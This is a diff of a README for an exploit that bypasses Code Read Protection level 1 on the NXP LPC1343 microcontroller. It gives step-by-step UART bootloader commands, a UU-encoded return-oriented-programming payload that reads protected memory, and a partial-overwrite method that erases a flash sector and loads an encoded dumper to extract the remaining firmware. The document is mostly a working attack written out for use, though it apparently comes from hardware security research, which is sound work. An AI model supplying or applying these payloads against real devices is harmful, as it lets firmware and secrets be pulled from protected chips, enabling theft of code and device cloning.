@@ -1,12 +1,58 @@
-# NXP LPC1343 CRP bypass
-This exploit bypasses CRP level 1 of the LPC1343 through Return-Oriented Programming. 
+# NXP LPC1343 CRP bypasses
+This exploit bypasses CRP level 1 of the LPC1343 through Return-Oriented Programming and partial overwrit. 
 
-## Exploit
-- Encode the exploit using a UU-encoding tool
+## ROP Exploit
 
-- Invoke the UART bootloader
+This assumes that the LCP is configured already in CRP 1.
 
-- Call the "Write to RAM" command by sending ```W 268443476 172``` to the bootloader.
+ * Make sure the LPC1343 is in the bootloader: close the BLD_E jumper and ground P0_3
+ * Connect via UART and send `?`
+ * From now all commands should end with `\r\n`
+ * You should get back `Synchronized\r\n`
+ * Send `Synchronized\r\n`
+ * You should get back `OK\r\n`
+ * Send `12000\r\n` to the board to set the clock rate to 12MHz. You should get back `OK\r\n`
+ * Let's try to read some memory, e.g. `R 0 4\r\n` - this will try to read 4 byte from 0x00, but will fail with error code `19` (CRP enabled) if chip is protected
+ * Let's exploit, first send: `W 268443476 172\r\n`
+ * Now, send this exploit to read from 0x000002fc (this is where CRP is stored): 
+ ```
+ L^PS_'____________`(``+L0_Q^[$/\?NQ#_'[L0_Q]_$?\?`````($._Q\`
+ ```
+ * This will give UUencoded memory block, you can repeatedly send `OK\r\n` to dump more memory
 
-- Send the encoded exploit to the device
+To change the read address, you need to adapt the address at offset  in `Exploit_Read_CRP_Value.bin`. Then, `uuencode` this file, and copy only the actual encoded part (not the header).
+
+## Partial Overwrite Exploit
+
+This assumes that you have multiple devices with the same code. The below is an example to overwrite sector 1, and dump sector 0 and 2...7:
+
+Enable Erase Command: U 23130
+
+ * Make sure the LPC1343 is in the bootloader: close the BLD_E jumper and ground P0_3
+ * Connect via UART and send `?`
+ * From now all commands should end with `\r\n`
+ * You should get back `Synchronized\r\n`
+ * Send `Synchronized\r\n`
+ * You should get back `OK\r\n`
+ * Send `12000\r\n` to the board to set the clock rate to 12MHz. You should get back `OK\r\n`
+ * Prepare Sector 1: `P 1 1\r\n`
+ * Erase Sector 1: `E 1 1\r\n`
+ * Write 256 bytes at 0x10001700 in RAM: `W 268441344 256\r\n`
+ * Send the encoded dumper (see Dumper.c):
+ ```
+M"TL`(EEIB`;\U1+X`1NR]8!?&6#VT4_T`%)9:8D&_-42^`$;LO4`3QE@]M'I
+MYP"_`(``0`"_`+\`OP"_`+\`OP"_`+\`OP"_`+\`OP"_`+\`OP"_`+\`OP"_
+M`+\`OP"_`+\`OP"_`+\`OP"_`+\`OP"_`+\`OP"_`+\`OP"_`+\`OP"_`+\`
+MOP"_`+\`OP"_`+\`OP"_`+\`OP"_`+\`OP"_`+\`OP"_`+\`OP"_`+\`OP"_
+M`+\`OP"_`+\`OP"_`+\`OP"_`+\`OP"_`+\`OP"_`+\`OP"_`+\`OP"_`+\`
+?OP"_`+\`OP"_`+\`OP"_`+\`OP"_`+\`OP"_`+\`OP``
+```
+* Send the checksum of the bytes: `25345\r\n`
+
+* Prepare Sector 1: `P 1 1\r\n`
+
+* Copy 256 bytes strating from address 0x10001700 in RAM to 0x1100 in flash: `C 4352 268441344 256\r\n`
+
+* Reset - will now dump sector 0 and sectors 2...7
+
 
